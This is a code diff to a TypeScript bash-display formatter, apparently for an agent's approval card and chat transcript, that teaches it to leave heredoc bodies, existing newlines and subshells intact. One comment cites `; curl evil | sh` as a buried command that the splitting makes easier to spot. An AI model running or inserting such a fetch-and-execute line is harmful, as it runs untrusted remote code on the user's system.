@@ -22,6 +22,115 @@ const BLOCK_HEADER: Record<string, 'block' | 'case'> = {
 export const DEFAULT_BASH_INDENT = 4
 export const MAX_BASH_INDENT = 8
 
+// Per-character roles a heredoc gives the script. A body is DATA, not shell: a
+// `;` ending a line of TypeScript, an apostrophe in a comment and a trailing `\`
+// are all literal, so every formatter here copies a body out byte for byte.
+// The opener - `<<EOF` up to and including the newline that starts the body - is
+// shell, but nothing may be broken onto a new line inside it: the body has to
+// follow the line the `<<` sits on, so `cat <<EOF && foo` splitting at the `&&`
+// would show a script that no longer means what it did. Everything else is
+// ordinary shell text (0).
+const HEREDOC_OPENER = 1
+const HEREDOC_BODY = 2
+
+// heredocAt reads the `<<`/`<<-` redirection at i, returning its delimiter (with
+// any quoting removed, since quoting only suppresses expansion - it never
+// changes what terminates the body) and the index just past the delimiter word.
+function heredocAt(cmd: string, i: number): { delim: string; strip: boolean; end: number } | null {
+  let j = i + 2
+  const strip = cmd[j] === '-'
+  if (strip) j++
+  while (cmd[j] === ' ' || cmd[j] === '\t') j++
+  let delim = ''
+  while (j < cmd.length) {
+    const ch = cmd[j]
+    if (ch === '\\' && j + 1 < cmd.length) {
+      delim += cmd[j + 1]
+      j += 2
+      continue
+    }
+    if (ch === "'" || ch === '"') {
+      const close = cmd.indexOf(ch, j + 1)
+      if (close < 0) return null
+      delim += cmd.slice(j + 1, close)
+      j = close + 1
+      continue
+    }
+    if (/[\s;&|<>()]/.test(ch)) break
+    delim += ch
+    j++
+  }
+  return delim ? { delim, strip, end: j } : null
+}
+
+// heredocFlags labels every character of the script HEREDOC_TEXT / _OPENER /
+// _BODY (see above). Quote-aware, and it handles several heredocs queued on one
+// line (`cat <<A <<B`) the way bash does: their bodies follow in order.
+//
+// An arithmetic left shift (`$((1 << 3))`) parses as an opener whose terminator
+// never arrives; the rest of the script is then treated as a body, i.e. shown
+// exactly as written. That is the same outcome as an unterminated heredoc, and
+// leaving text alone is always the safe direction here.
+function heredocFlags(cmd: string): Uint8Array {
+  const flags = new Uint8Array(cmd.length)
+  if (!cmd.includes('<<')) return flags
+  const queue: { delim: string; strip: boolean }[] = []
+  let openerStart = -1
+  let inSingle = false
+  let inDouble = false
+  let escaped = false
+  for (let i = 0; i < cmd.length; i++) {
+    const ch = cmd[i]
+    if (escaped) {
+      escaped = false
+      continue
+    }
+    if (ch === '\\' && !inSingle) {
+      escaped = true
+      continue
+    }
+    if (ch === "'" && !inDouble) {
+      inSingle = !inSingle
+      continue
+    }
+    if (ch === '"' && !inSingle) {
+      inDouble = !inDouble
+      continue
+    }
+    if (inSingle || inDouble) continue
+    // `<<<` is a here-string - it takes its data from the same line.
+    if (ch === '<' && cmd[i + 1] === '<' && cmd[i + 2] !== '<') {
+      const doc = heredocAt(cmd, i)
+      if (doc) {
+        if (!queue.length) openerStart = i
+        queue.push(doc)
+        i = doc.end - 1
+      }
+      continue
+    }
+    if (ch !== '\n' || queue.length === 0) continue
+    flags.fill(HEREDOC_OPENER, openerStart, i + 1)
+    // Walk whole lines, retiring one queued delimiter per terminator line, until
+    // the queue empties or the script ends.
+    let j = i + 1
+    while (queue.length > 0 && j < cmd.length) {
+      let eol = cmd.indexOf('\n', j)
+      if (eol < 0) eol = cmd.length
+      const line = queue[0].strip ? cmd.slice(j, eol).replace(/^\t+/, '') : cmd.slice(j, eol)
+      j = eol + 1
+      if (line === queue[0].delim) queue.shift()
+    }
+    // Stop short of the terminator's own newline so it stays ordinary shell text
+    // and the line-break bookkeeping below sees it.
+    const end = Math.min(j - 1, cmd.length)
+    flags.fill(HEREDOC_BODY, i + 1, Math.max(i + 1, end))
+    i = end - 1
+    queue.length = 0
+    openerStart = -1
+  }
+  return flags
+}
+
 // bareWordAt returns the unquoted lowercase word starting at i, provided it is a
 // whole token (the character after it delimits). The caller is responsible for
 // only asking when i is in command position - in `echo done` the `done` is an
@@ -37,9 +146,15 @@ function bareWordAt(cmd: string, i: number): string {
 // chained one-liner reads as separate steps, and lays a `for`/`while`/`until`/
 // `if`/`case` block out over its own indented lines. `indent` is the number of
 // spaces per level (0 leaves bodies flush left). It is deliberately optimistic:
-// it only tracks quotes, backslash escapes and command position, not the full
-// shell grammar, and a command that already contains newlines is left exactly as
-// written.
+// it only tracks quotes, backslash escapes, heredocs and command position, not
+// the full shell grammar.
+//
+// A script that already has newlines keeps them, and keeps its own indentation -
+// the author laid those lines out deliberately, so breaks are only ever ADDED,
+// never moved. That matters most for the shape agents write constantly:
+// `cd web && cat > f <<'EOF'` followed by a file's worth of code. The first line
+// is a chain like any other and now splits, while the heredoc body below it is
+// left untouched (see heredocFlags).
 //
 // It is DISPLAY-ONLY. The only edits it makes are inserting line breaks and
 // leading indentation, and dropping the run of spaces that a break just turned
@@ -49,8 +164,8 @@ function bareWordAt(cmd: string, i: number): string {
 // splitting merely makes a buried `; curl evil | sh` easier to spot, never
 // harder.
 export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDENT): string {
-  if (cmd.includes('\n')) return cmd
   const pad = ' '.repeat(Math.min(MAX_BASH_INDENT, Math.max(0, Math.trunc(indent) || 0)))
+  const flags = heredocFlags(cmd)
   let out = ''
   // The next break to emit, flushed lazily so the indent is computed at the
   // depth the line it starts actually sits at (a line opening with `done` has
@@ -73,6 +188,9 @@ export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDEN
   // `then`/`do`, or between `case` and its `in`. Chain operators there join one
   // condition instead of separating steps.
   let header: '' | 'block' | 'case' = ''
+  // Whether the character being read is part of a heredoc opener, which - like a
+  // header - cannot be broken across lines.
+  let inOpener = false
 
   const emit = (text: string) => {
     if (pending) {
@@ -81,12 +199,24 @@ export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDEN
     }
     out += text
   }
+  // The separator to put before the next step. A `(...)` subshell (or a `$( )`
+  // substitution) is ONE step of the script it sits in, so everything inside it
+  // stays on that step's line: `(fuser -k 21765/tcp >/dev/null 2>&1; true)` is a
+  // single idea - "kill it, ignoring failure" - and breaking it across three
+  // lines, with the `)` orphaned, read as three. Same reasoning as a block
+  // header, and it applies to every break (a chain operator, a `do`/`then` body,
+  // a case arm), so a subshell never straddles lines it did not already.
+  const sep = () => (parens > 0 || inOpener ? ' ' : '\n')
+  // Whether a break is already there - the output ends with one, or one is
+  // pending - so a keyword that opens its own line does not add a blank one when
+  // the script was written across lines to begin with.
+  const broken = () => pending === '\n' || (pending === '' && /\n[ \t]*$/.test(out))
   // Start the body of a block that the keyword at i just opened, skipping the
   // spaces the break makes trailing.
   const openBody = (i: number, kind: 'block' | 'case') => {
     stack.push(kind)
     header = ''
-    pending = '\n'
+    pending = sep()
     let j = i
     while (cmd[j + 1] === ' ' || cmd[j + 1] === '\t') j++
     commandStart = true
@@ -95,6 +225,14 @@ export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDEN
 
   for (let i = 0; i < cmd.length; i++) {
     const ch = cmd[i]
+    // A heredoc body is data: copy it out unread. What follows it is the start of
+    // a command again.
+    if (flags[i] === HEREDOC_BODY) {
+      out += ch
+      commandStart = true
+      continue
+    }
+    inOpener = flags[i] === HEREDOC_OPENER
     if (escaped) {
       emit(ch)
       escaped = false
@@ -123,6 +261,15 @@ export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDEN
       continue
     }
 
+    // A newline the author wrote is the break itself: it satisfies any pending
+    // one, and the indentation of the line it starts is theirs to choose.
+    if (ch === '\n') {
+      pending = ''
+      out += ch
+      commandStart = true
+      continue
+    }
+
     // `case <subject> in`: the `in` closes the header, and unlike `do`/`then` it
     // follows the subject rather than sitting in command position - so it is
     // matched on a plain word boundary. `for x in ...` is unaffected: its header
@@ -141,7 +288,7 @@ export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDEN
         if (keyword === 'esac' && stack[stack.length - 1] === 'branch') stack.pop()
         stack.pop()
         header = ''
-        if (out && pending !== '\n') pending = '\n'
+        if (out && !broken()) pending = sep()
       }
       emit(keyword)
       i += keyword.length - 1
@@ -181,7 +328,7 @@ export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDEN
       if (stack[stack.length - 1] === 'branch') stack.pop()
       while (cmd[i + 1] === ' ' || cmd[i + 1] === '\t') i++
       commandStart = true
-      if (i + 1 < cmd.length) pending = '\n'
+      if (i + 1 < cmd.length) pending = sep()
       continue
     }
 
@@ -206,7 +353,7 @@ export function splitBashChains(cmd: string, indent: number = DEFAULT_BASH_INDEN
     // easier, to scan. Other control chains still split normally.
     const rest = cmd.slice(i + 1).trim()
     const trivialFallback = ch === '|' && /^(?:true|:)\s*$/.test(rest)
-    pending = header || trivialFallback ? ' ' : '\n'
+    pending = header || trivialFallback ? ' ' : sep()
   }
   return out
 }
@@ -285,16 +432,22 @@ export function unwrapBashLoginCommand(command: string): string {
 // some agents emit before the first real line - are removed.
 //
 // Quote-aware: inside single quotes a backslash is literal, so `\`-newline there
-// is left alone. Unlike splitBashChains this DOES remove characters, so it is for
-// the chat transcript only, never the approval card.
+// is left alone - as is one inside a heredoc body, which is data. Unlike
+// splitBashChains this DOES remove characters, so it is for the chat transcript
+// only, never the approval card.
 export function stripLineContinuations(cmd: string): string {
   if (!cmd.includes('\n')) return cmd
+  const flags = heredocFlags(cmd)
   let out = ''
   let inSingle = false
   let inDouble = false
   let escaped = false
   for (let i = 0; i < cmd.length; i++) {
     const ch = cmd[i]
+    if (flags[i] === HEREDOC_BODY) {
+      out += ch
+      continue
+    }
     if (escaped) {
       out += ch
       escaped = false
@@ -322,15 +475,21 @@ export function stripLineContinuations(cmd: string): string {
 // (allowing trailing spaces) or at the very end of the script - once a chain has
 // been split onto separate lines, `cmd;` + newline is exactly `cmd` + newline in
 // bash, so the `;` is pure noise. Quote-aware, and it never touches a `;;` case
-// terminator. Display-only (chat, not the approval card) since it removes
-// characters.
+// terminator, and never one inside a heredoc body - a line of TypeScript ending
+// in `;` is not a shell separator. Display-only (chat, not the approval card)
+// since it removes characters.
 export function dropRedundantSemicolons(cmd: string): string {
+  const flags = heredocFlags(cmd)
   let out = ''
   let inSingle = false
   let inDouble = false
   let escaped = false
   for (let i = 0; i < cmd.length; i++) {
     const ch = cmd[i]
+    if (flags[i] === HEREDOC_BODY) {
+      out += ch
+      continue
+    }
     if (escaped) {
       out += ch
       escaped = false
